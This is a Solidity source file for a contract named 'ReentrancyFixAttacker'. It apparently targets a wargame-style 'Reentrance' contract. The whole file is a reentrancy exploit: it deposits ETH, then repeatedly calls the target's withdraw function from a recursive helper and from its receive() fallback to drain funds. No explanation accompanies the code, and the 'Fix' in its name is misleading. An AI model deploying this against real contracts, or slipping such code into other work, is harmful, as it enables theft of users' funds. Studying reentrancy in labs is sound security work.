pragma solidity ^0.6.12;

contract ReentrancyFixAttacker {
    address public reentranceInstance;

    constructor(address _instance) public {
        reentranceInstance = _instance;
    }

    function attack() public payable {
        // Donate ETH to the reentrance contract
        bool success = donate(msg.value);
        require(success, "Donate failed");

        // Get attacker's balance in Reentrance
        uint256 balance = getMyBalance();
        // Withdraw the balance
callWithdraw(balance);
    }

    function callWithdraw(uint256 _amount) internal {
        (bool result, ) = reentranceInstance.call(abi.encodeWithSignature("withdraw(uint256)", _amount));
        if (result) {
            // Re-entrancy: withdraw again the same amount
            callWithdraw(_amount);
        }
    }

    function donate(uint256 _amount) internal returns (bool) {
        (bool deposit, ) = reentranceInstance.call{value: _amount}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        return deposit;
    }

    function getMyBalance() internal view returns (uint256 balance) {
        // Use low-level call to get attacker's balance in Reentrance contract
        (bool success, bytes memory data) = reentranceInstance.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        if (success) {
            return abi.decode(data, (uint256));
        } else {
            return 0;
        }
    }

    receive() external payable {
        // Re-entrancy attack logic
        uint256 balance = getMyBalance();
        if (balance > 0) {
            callWithdraw(balance);
        }
    }
}